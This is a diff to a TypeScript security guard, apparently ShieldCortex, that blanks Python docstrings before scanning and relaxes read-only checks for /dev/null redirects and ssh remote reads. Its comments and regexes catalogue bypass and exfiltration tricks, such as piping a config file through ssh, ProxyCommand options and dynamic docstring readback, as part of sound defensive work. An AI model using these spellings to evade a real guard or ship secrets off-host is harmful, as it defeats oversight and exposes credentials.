@@ -3394,6 +3394,181 @@ const BLANKING_PAD = ' '.repeat(512);
  * file is prose. The lexer pass is nearly all of it — the rewrite is a
  * pad-and-join, because a regex per comment cost 14ms of that on its own.
  */
+/**
+ * #1077 case 1: blank the DOCSTRINGS of a Python source folded from disk, the
+ * same length-preserving way #532 blanks its comments, so a usage block naming
+ * `~/.shieldcortex/config.json` or `python3 scripts/x.py` is prose, not access
+ * and not an invocation. Two gates, both fail closed: on any doubt nothing is
+ * blanked and the source keeps its whole pre-#1077 scan surface.
+ *
+ * 1. TOKENISED, not pattern-matched (review r1: a line-anchored regex took a
+ *    CLOSING delimiter for an opening one and blanked the real `open()` that
+ *    sat between two literals). `pythonStandaloneDocstrings` walks the source
+ *    the way Python's tokenizer does — string prefixes, single and triple
+ *    quotes, escapes, bracket depth, backslash continuations — and accepts a
+ *    triple-quoted literal only when it is a whole logical line on its own:
+ *    bracket depth 0, nothing but indentation before its opening quotes on a
+ *    line that starts a new logical line, nothing but spaces after its closing
+ *    quotes up to the newline. Such a literal cannot be an operand, an argument
+ *    or one half of an implicit concatenation. Anything the walk cannot read
+ *    with certainty aborts the whole pass: an unterminated literal, an unknown
+ *    prefix, a stray backslash, an unbalanced bracket, or an f-/t-string whose
+ *    replacement field holds a quote, backslash or `#` (PEP 701 lets a field
+ *    reuse the outer quote, where a simple walk and Python disagree).
+ *
+ * 2. NO IN-MEMORY READBACK in the code that remains. Python keeps a docstring
+ *    (`__doc__`, the code object's constants) and a sink can reach it without
+ *    ever spelling it (review r1: `globals()['__'+'doc__']`,
+ *    `getattr(inspect, 'get'+'doc')`). So this is not a denylist of readback
+ *    spellings: blanking is refused when the code — everything but the
+ *    docstrings, string literals included — holds ANY `__` other than
+ *    `__name__`/`__main__`/`__init__`/`__future__`; ANY dynamic name or
+ *    attribute lookup (`getattr`, `globals`, `locals`, `vars`, `dir`, `eval`,
+ *    `exec`, builtin `compile`, `format`, `attrgetter` …); frame or code-object
+ *    access; a way to read a parser's help text back or capture stdout; a
+ *    self-path (`argv`, `/proc/`, a `.py` literal) or stdin; or an import
+ *    outside a small stdlib set that exposes no docstring (`inspect`, `pydoc`,
+ *    `doctest`, `functools`, `types`, `io`, every third-party package —
+ *    `click`, `docopt`, `fire` read docstrings themselves — are all out).
+ *
+ *    NO EXEMPTION, argparse included (review r2). `description=__doc__` is a
+ *    `__` like any other, so a script that hands its docstring to argparse
+ *    keeps that docstring on the scan surface. r1 exempted that one keyword,
+ *    which made the gate a denylist of the ways argparse hands the text back
+ *    (`_get_kwargs()`, `repr(ap)`), of the ways `argparse.ArgumentParser` can
+ *    be rebound (an annotated or tuple-target assignment, a backslash before
+ *    `=`, `ArgumentParser.__init__ = …`) and of the ways fd 1 can be moved
+ *    before `-h` prints it (`os.close(1 + 0)`, `os.closerange(1, 2)`); every
+ *    round found the next spelling. The owner's route for such a script is
+ *    the pin (`shieldcortex allowlist add`). The help-text and stdout terms
+ *    above are kept as defence in depth; none is load-bearing.
+ *
+ * RESIDUAL, the class #532 already carries for comments: a script that opens
+ * its OWN file through a path this gate cannot see (a split literal of its own
+ * name, a glob) reads a docstring back from disk exactly as it could read a
+ * comment there. #1077 adds no reach #532 does not already have.
+ *
+ * A docstring holding a URL (`://`) is never blanked: egress evidence keeps
+ * its pre-#1077 surface. Disk bytes only; inline `-c` programs are never
+ * passed here.
+ */
+const PY_DOC_SAFE_IMPORTS = new Set([
+  '__future__', 'argparse', 'base64', 'collections', 'configparser', 'copy', 'csv', 'dataclasses',
+  'datetime', 'enum', 'errno', 'fnmatch', 'getpass', 'glob', 'gzip', 'hashlib', 'http', 'itertools',
+  'json', 'logging', 'math', 'os', 'pathlib', 'platform', 'queue', 'random', 're', 'shlex', 'shutil',
+  'signal', 'socket', 'sqlite3', 'stat', 'struct', 'subprocess', 'sys', 'tarfile', 'tempfile',
+  'textwrap', 'threading', 'time', 'typing', 'urllib', 'uuid', 'zipfile', 'zlib',
+]);
+const PY_DOC_ALLOWED_DUNDER_RE = /\b__(?:name|main|init|future)__\b/g;
+const PY_DOC_READBACK_RE = new RegExp([
+  '__',
+  String.raw`\b(?:getattr|setattr|delattr|attrgetter|methodcaller|globals|locals|vars|eval|exec|execfile|format|format_map|breakpoint)\b`,
+  String.raw`(?<![.\w])(?:compile|dir|help|input)[ \t]*\(`,
+  String.raw`\b(?:inspect|pydoc|doctest|unittest|linecache|tokenize|traceback|ast|dis|gc|ctypes|pickle|marshal|importlib|modules|_getframe|_current_frames|currentframe|exc_info|excepthook|settrace|setprofile|addaudithook|monitoring|wraps|update_wrapper)\b`,
+  String.raw`\b(?:f|co|tb|gi|cr|ag)_[a-z]`,
+  String.raw`\b(?:epilog|usage|formatter_class|\w*Formatter|add_text|_add_item|_join_parts|_fill_text|_format_text|_split_lines|_get_formatter|_print_message|format_help|format_usage|print_help|print_usage)\b`,
+  String.raw`\.[ \t]*(?:description|epilog|usage)\b`,
+  String.raw`\b(?:redirect_stdout|redirect_stderr|dup|dup2|fdopen|openpty|stdin|orig_argv|argv)\b|\.[ \t]*(?:stdout|stderr|write)[ \t]*=[^=]|\b(?:close|read)[ \t]*\([ \t]*[0-2][ \t]*[,)]`,
+  String.raw`\/proc\/|\.pyw?\b`,
+].join('|'));
+
+/** Every top-level module the code imports is in `PY_DOC_SAFE_IMPORTS`. */
+function pyImportsAreDocSafe(code: string): boolean {
+  const FROM_RE = /\bfrom[ \t]+([\w.]+)[ \t]+import\b(?:[ \t]*\([^)]*\)|[^\n;]*)/g;
+  for (const m of code.matchAll(FROM_RE)) if (!PY_DOC_SAFE_IMPORTS.has(m[1].split('.')[0])) return false;
+  for (const m of code.replace(FROM_RE, ' ').matchAll(/\bimport\b([^\n;]*)/g)) {
+    for (const part of m[1].split(',')) {
+      const name = part.trim().split(/\s+/)[0] ?? '';
+      if (!PY_DOC_SAFE_IMPORTS.has(name.split('.')[0])) return false;
+    }
+  }
+  return true;
+}
+
+/**
+ * `[start, end)` of each triple-quoted literal that is a whole logical line by
+ * itself (see `blankPythonDocstrings`); `null` when the walk is not certain it
+ * reads the source as Python would.
+ */
+function pythonStandaloneDocstrings(src: string): Array<[number, number]> | null {
+  const found: Array<[number, number]> = [];
+  const n = src.length;
+  let depth = 0;
+  let lineStart = true;           // only indentation since a logical-line break at depth 0
+  let i = 0;
+  while (i < n) {
+    const c = src[i];
+    if (c === '\n') { if (depth === 0) lineStart = true; i++; continue; }
+    if (c === ' ' || c === '\t' || c === '\r' || c === '\f') { i++; continue; }
+    if (c === '#') { while (i < n && src[i] !== '\n') i++; continue; }
+    if (c === '\\') {
+      const skip = src[i + 1] === '\n' ? 2 : src[i + 1] === '\r' && src[i + 2] === '\n' ? 3 : 0;
+      if (!skip) return null;
+      i += skip; lineStart = false; continue;
+    }
+    if (c === '(' || c === '[' || c === '{') { depth++; lineStart = false; i++; continue; }
+    if (c === ')' || c === ']' || c === '}') { if (--depth < 0) return null; lineStart = false; i++; continue; }
+    let j = i;
+    while (j < n && /\w/.test(src[j])) j++;
+    const q = src[j];
+    if (q !== '"' && q !== "'") { lineStart = false; i = j > i ? j : i + 1; continue; }
+    const prefix = src.slice(i, j).toLowerCase();
+    if (prefix && !/^[rubft]{1,2}$/.test(prefix)) return null;
+    const triple = src.startsWith(q + q + q, j);
+    const delim = triple ? q + q + q : q;
+    const fmt = /[ft]/.test(prefix);
+    let k = j + delim.length;
+    let field = 0;
+    let close = -1;
+    while (k < n) {
+      const ch = src[k];
+      if (fmt && field > 0) {
+        if (ch === '"' || ch === "'" || ch === '\\' || ch === '#') return null;
+        if (ch === '{') field++;
+        else if (ch === '}') field--;
+        k++;
+        continue;
+      }
+      if (ch === '\\') { k += 2; continue; }
+      if (!triple && ch === '\n') return null;
+      if (fmt && ch === '{') { if (src[k + 1] === '{') { k += 2; continue; } field = 1; k++; continue; }
+      if (src.startsWith(delim, k)) { close = k; break; }
+      k++;
+    }
+    if (close < 0) return null;
+    const end = close + delim.length;
+    if (triple && lineStart && depth === 0 && (prefix === '' || prefix === 'r' || prefix === 'u')) {
+      let e = end;
+      while (e < n && (src[e] === ' ' || src[e] === '\t' || src[e] === '\r')) e++;
+      if (e >= n || src[e] === '\n') found.push([i, end]);
+    }
+    lineStart = false;
+    i = end;
+  }
+  return depth === 0 ? found : null;
+}
+
+function blankPythonDocstrings(src: string, lang: ScriptLang): string {
+  if (lang !== 'python' || !src || !(src.includes('"""') || src.includes("'''"))) return src;
+  const docs = pythonStandaloneDocstrings(src);
+  if (!docs || docs.length === 0) return src;
+  let code = '';
+  let cursor = 0;
+  for (const [lo, hi] of docs) { code += src.slice(cursor, lo) + blankedRun(src, lo, hi); cursor = hi; }
+  code += src.slice(cursor);
+  const gated = code.replace(PY_DOC_ALLOWED_DUNDER_RE, ' ');
+  if (PY_DOC_READBACK_RE.test(gated) || !pyImportsAreDocSafe(gated)) return src;
+  // Egress evidence is not the floor: a docstring naming a network
+  // destination keeps contributing it exactly as before #1077 (the #920
+  // secret-egress fixtures rely on it). Only guard-path prose is relieved.
+  const blank = docs.filter(([lo, hi]) => !src.slice(lo, hi).includes('://'));
+  if (blank.length === docs.length) return code;
+  let out = '';
+  cursor = 0;
+  for (const [lo, hi] of blank) { out += src.slice(cursor, lo) + blankedRun(src, lo, hi); cursor = hi; }
+  return cursor === 0 ? src : out + src.slice(cursor);
+}
+
 function blankInterpreterComments(src: string, lang: ScriptLang): string {
   if (lang === 'sh' || !src) return src;
   const rules = SCRIPT_LANG_RULES[lang];
@@ -3917,6 +4092,65 @@ const STORE_MUTATION_RE = new RegExp(
   'i',
 );
 
+/**
+ * #1077: a redirect whose target is exactly `/dev/null` (`2>/dev/null`,
+ * `>/dev/null`, `&>/dev/null`, `2>> /dev/null`) discards output; it writes no
+ * file. The read-only carve-outs below treated it as a write, so the routine
+ * `ls ~/.shieldcortex/approvals/ 2>/dev/null` was held as a store mutation.
+ * Each discard is replaced by a space (never glued to a neighbour) BEFORE the
+ * mutation test, so any other redirect in the same command still fails the
+ * carve-out. The target must END at `/dev/null`: `>/dev/null/../x` is a path
+ * through it and is left in place. Quoted `"/dev/null"` is not stripped
+ * (fail closed: it stays a redirect, the carve-out stays off).
+ */
+const DEV_NULL_DISCARD_RE = /(?:\d|&)?>{1,2}\|?[ \t]*\/dev\/null(?=$|[\s;&|)])/g;
+export function stripDevNullDiscards(cmd: string): string {
+  return String(cmd || '').replace(DEV_NULL_DISCARD_RE, ' ');
+}
+
+/**
+ * #1077 case 2: `ssh host 'cat ~/.openclaw/openclaw.json'` reads a file on
+ * another host, yet the carve-outs below judged `ssh` as an unknown verb and
+ * held it on the self-protection floor. The guard cannot prove `host` is not
+ * this machine, so this does NOT trust the host: it replaces the ssh wrapper
+ * with the remote command and lets the SAME read-only test that already
+ * relieves a LOCAL `cat` of that path judge it. A remote read is relieved
+ * exactly when the local read would be; a remote write (`'echo {} > …'`,
+ * `'sed -i …'`, `'cat …; rm …'`) still fails the test and keeps the gate.
+ *
+ * Unwrapped only when `ssh` is the FIRST WORD OF THE WHOLE COMMAND (review r1:
+ * after a `|`, `;`, `&&` or a newline a preceding stage can feed ssh's stdin,
+ * and `cat ~/.shieldcortex/config.json | ssh h cat` ships the file off-host
+ * whatever the remote command is), never after `sudo`/`env`/a `VAR=` prefix,
+ * with no `<` ANYWHERE in the command (a stdin redirect, here-doc,
+ * here-string or process substitution feeds it too; review r2: the stage
+ * pattern stopped at the `&` of `2>&1`, so `ssh h cat 2>&1 < FILE` unwrapped
+ * to a local `cat … < FILE` and the redirect that fed ssh read as harmless),
+ * every option is from a closed set that neither runs a local command nor
+ * writes a local file (`-o ProxyCommand`,
+ * `-o LocalCommand`, `-F <config>`, `-E <log>` are refused), and the remote
+ * command is a single-quoted string, or a double-quoted one with no `$`,
+ * backtick or backslash (local expansion), or plain words to the end of the
+ * stage. The local side of the pipeline is left in place and judged as
+ * written. Anything else is left as `ssh …`, an unknown verb: gate kept.
+ */
+const SSH_SAFE_OPT = String.raw`(?:-[46CqTtnv]+|-p[ \t]*\d+|-l[ \t]*[\w.-]+|-o[ \t]*(?:ConnectTimeout|BatchMode|StrictHostKeyChecking|ServerAliveInterval|ServerAliveCountMax|ConnectionAttempts|LogLevel)=[\w.-]+)`;
+const SSH_REMOTE_READ_RE = new RegExp(
+  String.raw`^([ \t]*)ssh((?:[ \t]+${SSH_SAFE_OPT})*)[ \t]+(?!-)[\w.@-]+[ \t]+(?:'([^']*)'|"([^"$` + '`' + String.raw`\\]*)"|([^'"\s;&|<>()][^;&|\n'"<>()]*?))(?=[ \t]*(?:$|[;&|\n]|\d?>))`,
+  '',
+);
+export function unwrapSshRemoteCommands(cmd: string): string {
+  const text = String(cmd || '');
+  if (text.includes('<')) return text;
+  return text.replace(SSH_REMOTE_READ_RE, (_m, lead: string, _opts: string, sq?: string, dq?: string, bare?: string) =>
+    `${lead}${sq ?? dq ?? bare ?? ''}`);
+}
+
+/** #1077: the text the read-only carve-outs judge — discards dropped, ssh wrappers opened. */
+function readOnlyCarveOutSurface(text: string): string {
+  return stripDevNullDiscards(unwrapSshRemoteCommands(stripDevNullDiscards(String(text || ''))));
+}
+
 /** Nested execution keeps the gate. */
 // The function-definition arm starts only at a word start (#874 review): any
 // match starting mid-word has one starting at that word's start, so this is
@@ -4005,7 +4239,7 @@ export function policyLockAccessIsReadOnly(text: string): boolean {
  * The caller still refuses the carve-out when a #500 command shape is present.
  */
 export function guardConfigAccessIsReadOnly(text: string): boolean {
-  const cmd = String(text || '');
+  const cmd = readOnlyCarveOutSurface(text);
   if (!GUARD_CONFIG_PATH_RE.test(cmd)) return false;
   if (STORE_MUTATION_RE.test(cmd)) return false;
   if (STORE_NESTED_EXEC_RE.test(cmd)) return false;
@@ -4967,7 +5201,7 @@ interface ReadOnlyShellOptions {
 }
 
 function shellAccessIsReadOnly(text: string, opts: ReadOnlyShellOptions): boolean {
-  const cmd = String(text || '');
+  const cmd = readOnlyCarveOutSurface(text);
   if (!opts.pathRe.test(cmd)) return false;
   if (STORE_MUTATION_RE.test(cmd)) return false;
   if (STORE_NESTED_EXEC_RE.test(cmd)) return false;
@@ -6715,7 +6949,7 @@ export function detectScriptInvocation(execSurface: string, depth = 0): string[]
  * scanned: a shell script's lines are shell statements, a Python or JS file's
  * lines are not — see `SCRIPT_LANG_RULES` and `buildSpanCtx`.
  */
-export function detectScriptInvocations(execSurface: string, depth = 0): DetectedScript[] {
+export function detectScriptInvocations(execSurface: string, depth = 0, foldedInterpreterSource = false): DetectedScript[] {
   const found: DetectedScript[] = [];
   if (!execSurface || depth > MAX_INLINE_RECURSION) return found;
 
@@ -6730,6 +6964,12 @@ export function detectScriptInvocations(execSurface: string, depth = 0): Detecte
   const add = (p: string, lang?: ScriptLang): void => {
     const clean = p.trim();
     if (!clean || clean === '-' || /^https?:\/\//i.test(clean)) return;
+    // #1077: in a folded INTERPRETER source (Python/JS/…, never shell) a lone
+    // `/` is the `Path.home() / "x"` division operator, not an unreadable
+    // script. Only that exact token, only there (review r1: every other
+    // trailing-slash path stays detected — `python3 app/` runs
+    // `app/__main__.py`, and `./deploy/` must keep reporting opaque).
+    if (foldedInterpreterSource && clean === '/') return;
     const resolved = lang ?? langFromPath(clean);
     // De-duplicate on path AND language. Keying on path alone discarded a
     // SECOND invocation of the same file by a different interpreter, so
@@ -6774,7 +7014,7 @@ export function detectScriptInvocations(execSurface: string, depth = 0): Detecte
             // The inline program itself is already in the exec surface (and
             // already scanned); only follow a file invocation NESTED in it.
             if (/^(?:bash|sh|zsh|ksh|dash|ash)$/.test(base)) {
-              for (const nested of detectScriptInvocations(tokens[j + 1] ?? '', depth + 1)) add(nested.path, nested.lang);
+              for (const nested of detectScriptInvocations(tokens[j + 1] ?? '', depth + 1, foldedInterpreterSource)) add(nested.path, nested.lang);
             }
             break;
           }
@@ -7025,7 +7265,7 @@ function foldScriptSources(
       ? expandFileSubstitutions(plainSrc, resolveScriptSource, subst, 1)
       : plainSrc;
     const reviewedScan = next.lang !== 'sh'
-      ? blankInterpreterComments(plainSrc, next.lang)
+      ? blankPythonDocstrings(blankInterpreterComments(plainSrc, next.lang), next.lang)
       : expandedSrc === plainSrc
         ? commandScanText(plainSrc)
         : `${commandScanText(plainSrc)}\n${commandScanText(expandedSrc)}`;
@@ -7037,7 +7277,7 @@ function foldScriptSources(
       // of entries that can reach here is bounded by the root-owned lock's
       // ceiling rather than by the same-UID config alone.
       const nestedOfReviewed = next.lang === 'sh' || hasShellOutSink(reviewedScan, next.lang, true)
-        ? detectScriptInvocations(reviewedScan)
+        ? detectScriptInvocations(reviewedScan, 0, next.lang !== 'sh')
         : [];
       if (nestedOfReviewed.length > 0) {
         if (next.depth >= MAX_SCRIPT_DEPTH) opaque = true;
@@ -7076,7 +7316,7 @@ function foldScriptSources(
     // on an unmasked sink-bearing program, so the three planes agree. Comments
     // are already blanked from `scan`, so a path mentioned in a docstring is
     // not followed.
-    const nested = next.lang === 'sh' || hasSink ? detectScriptInvocations(scan) : [];
+    const nested = next.lang === 'sh' || hasSink ? detectScriptInvocations(scan, 0, next.lang !== 'sh') : [];
     if (nested.length > 0) {
       if (next.depth >= MAX_SCRIPT_DEPTH) opaque = true;         // depth exceeded — say so
       else for (const n of nested) {
